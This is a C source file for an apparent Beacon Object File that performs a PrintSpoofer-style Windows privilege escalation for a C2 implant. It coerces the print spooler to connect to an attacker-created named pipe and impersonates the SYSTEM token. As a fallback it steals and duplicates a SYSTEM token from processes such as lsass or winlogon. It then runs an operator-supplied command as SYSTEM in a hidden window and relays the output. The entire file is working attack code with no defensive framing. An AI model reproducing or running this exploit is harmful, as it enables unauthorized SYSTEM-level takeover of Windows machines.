#include <windows.h> 
#include "beacon.h"
#include "def.h"

typedef BOOL (WINAPI *pOpenPrinterW)(LPWSTR, LPHANDLE, LPVOID);
typedef BOOL (WINAPI *pRemoteFindFirstPrinterChangeNotificationEx)(HANDLE, DWORD, DWORD, LPWSTR, DWORD, LPVOID);

BOOL EnablePrivilege(LPCWSTR pwszPrivilege) {
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tp;

    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return FALSE;
    if (!ADVAPI32$LookupPrivilegeValueW(NULL, pwszPrivilege, &luid)) {
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        KERNEL32$CloseHandle(hToken);
        return FALSE;
    }

    KERNEL32$CloseHandle(hToken);
    return TRUE;
}

BOOL IsSystemSid(PSID pSid) {
    if (!pSid) return FALSE;
    unsigned char* sid = (unsigned char*)pSid;
    if (sid[0] != 1) return FALSE; 
    if (sid[1] != 1) return FALSE; 
    if (sid[7] != 5) return FALSE; 
    if (sid[8] != 18) return FALSE;
    return TRUE;
}

HANDLE StealSystemToken() {
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Method 2: Scanning for reliable user-mode SYSTEM token...\n");
    
    HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return NULL;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);
    HANDLE hSysToken = NULL;

    if (KERNEL32$Process32FirstW(hSnap, &pe)) {
        do {
            if (pe.th32ProcessID <= 100) {
                if (MSVCRT$_wcsicmp(pe.szExeFile, L"wininit.exe") != 0 &&
                    MSVCRT$_wcsicmp(pe.szExeFile, L"services.exe") != 0 &&
                    MSVCRT$_wcsicmp(pe.szExeFile, L"lsass.exe") != 0 &&
                    MSVCRT$_wcsicmp(pe.szExeFile, L"winlogon.exe") != 0) continue;
            }
            if (MSVCRT$_wcsicmp(pe.szExeFile, L"smss.exe") == 0 || 
                MSVCRT$_wcsicmp(pe.szExeFile, L"csrss.exe") == 0) continue;

            HANDLE hProc = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe.th32ProcessID);
            if (hProc) {
                HANDLE hToken = NULL;
                if (ADVAPI32$OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
                    TOKEN_USER *tu = (TOKEN_USER*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 512);
                    DWORD rl = 0;
                    if (ADVAPI32$GetTokenInformation(hToken, TokenUser, tu, 512, &rl)) {
                        if (IsSystemSid(tu->User.Sid)) {
                            if (ADVAPI32$DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hSysToken)) {
                                BeaconPrintf(CALLBACK_OUTPUT, "[+] Using token from %ls (PID: %d)\n", pe.szExeFile, pe.th32ProcessID);
                                KERNEL32$CloseHandle(hToken);
                                KERNEL32$CloseHandle(hProc);
                                KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, tu);
                                break;
                            }
                        }
                    }
                    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, tu);
                    KERNEL32$CloseHandle(hToken);
                }
                KERNEL32$CloseHandle(hProc);
            }
        } while (KERNEL32$Process32NextW(hSnap, &pe));
    }

    KERNEL32$CloseHandle(hSnap);
    return hSysToken;
}

void TriggerSpooler(DWORD dwTick, DWORD dwPid) {
    HMODULE hSpool = KERNEL32$LoadLibraryA("winspool.drv");
    if (!hSpool) hSpool = KERNEL32$LoadLibraryA("spoolss.dll");
    if (!hSpool) return;

    pOpenPrinterW fOpenPrinterW = (pOpenPrinterW)KERNEL32$GetProcAddress(hSpool, "OpenPrinterW");
    pRemoteFindFirstPrinterChangeNotificationEx fRemote = (pRemoteFindFirstPrinterChangeNotificationEx)KERNEL32$GetProcAddress(hSpool, "RemoteFindFirstPrinterChangeNotificationEx");

    if (fOpenPrinterW && fRemote) {
        HANDLE hPrinter = NULL;
        if (fOpenPrinterW(NULL, &hPrinter, NULL)) {
            WCHAR pwszCaptureServer[MAX_PATH];
            USER32$wsprintfW(pwszCaptureServer, L"\\\\127.0.0.1/pipe/%08X%08X", dwTick, dwPid);
            fRemote(hPrinter, PRINTER_CHANGE_ADD_JOB, 0, pwszCaptureServer, 0, NULL);
            KERNEL32$CloseHandle(hPrinter);
        }
    }
}

void go(LPSTR args, INT alen) {
    EnablePrivilege(L"SeImpersonatePrivilege");
    EnablePrivilege(L"SeDebugPrivilege");

    datap parser;
    BeaconDataParse(&parser, args, alen);
    
    // BACK TO BASICS: One required positional arg
    char *command = BeaconDataExtract(&parser, NULL);
    
    if (!command || !*command) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No command provided. Usage: printspoofer <command>\n");
        return;
    }

    DWORD dwTick = KERNEL32$GetTickCount();
    DWORD dwPid = KERNEL32$GetCurrentProcessId();

    char serverPipe[256];
    USER32$wsprintfA(serverPipe, "\\\\.\\pipe\\%08X%08X\\pipe\\spoolss", dwTick, dwPid);

    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, FALSE };
    ADVAPI32$ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;OICI;GA;;;WD)", SDDL_REVISION_1, &(sa.lpSecurityDescriptor), NULL);

    HANDLE hPipe = KERNEL32$CreateNamedPipeA(serverPipe, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, 10, 2048, 2048, 0, &sa);
    HANDLE hEvent = KERNEL32$CreateEventA(NULL, TRUE, FALSE, NULL);
    OVERLAPPED ol = {0};
    ol.hEvent = hEvent;

    KERNEL32$ConnectNamedPipe(hPipe, &ol);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Method 1: Spooler exploit...\n");
    TriggerSpooler(dwTick, dwPid);

    HANDLE hSysToken = NULL;
    if (KERNEL32$WaitForSingleObject(hEvent, 2000) == WAIT_OBJECT_0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Spooler connected! Impersonating...\n");
        if (ADVAPI32$ImpersonateNamedPipeClient(hPipe)) {
            if (ADVAPI32$OpenThreadToken((HANDLE)-2, TOKEN_ALL_ACCESS, FALSE, &hSysToken)) {
                HANDLE hPrimary = NULL;
                if (ADVAPI32$DuplicateTokenEx(hSysToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hPrimary)) {
                    KERNEL32$CloseHandle(hSysToken);
                    hSysToken = hPrimary;
                }
            }
        }
    } else {
        // ALWAYS keep this fix - it prevents Sliver from hanging
        KERNEL32$CancelIo(hPipe);
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Method 1 timed out. Pivoting to Method 2...\n");
        hSysToken = StealSystemToken();
    }

    if (hSysToken) {
        HANDLE hRead, hWrite;
        SECURITY_ATTRIBUTES pSa = { sizeof(pSa), NULL, TRUE };
        if (KERNEL32$CreatePipe(&hRead, &hWrite, &pSa, 0)) {
            STARTUPINFOW si = {sizeof(si)};
            si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
            si.wShowWindow = SW_HIDE;
            si.hStdOutput = hWrite;
            si.hStdError = hWrite;
            
            PROCESS_INFORMATION pi = {0};
            int clen = 0; while(command[clen]) clen++;
            WCHAR *wcmd = (WCHAR*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, (clen + 1) * sizeof(WCHAR));
            for(int x=0; x<clen; x++) wcmd[x] = (WCHAR)command[x];
            
            ADVAPI32$RevertToSelf(); 
            if (ADVAPI32$CreateProcessWithTokenW(hSysToken, 0, NULL, wcmd, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] SUCCESS: Escalated to SYSTEM.\n");
                KERNEL32$CloseHandle(hWrite);
                char buffer[2048];
                DWORD bytesRead;
                while (KERNEL32$ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                    buffer[bytesRead] = '\0';
                    BeaconPrintf(CALLBACK_OUTPUT, "%s", buffer);
                }
                KERNEL32$WaitForSingleObject(pi.hProcess, 3000); 
                KERNEL32$CloseHandle(pi.hProcess); KERNEL32$CloseHandle(pi.hThread);
                BeaconPrintf(CALLBACK_OUTPUT, "[*] PrintSpoofer execution complete.\n");
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[-] Escalation failed: %d\n", KERNEL32$GetLastError());
            }
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, wcmd);
            KERNEL32$CloseHandle(hRead);
        }
        KERNEL32$CloseHandle(hSysToken);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Escalation failed to acquire SYSTEM token.\n");
    }

    KERNEL32$CloseHandle(hEvent);
    KERNEL32$CloseHandle(hPipe);
}
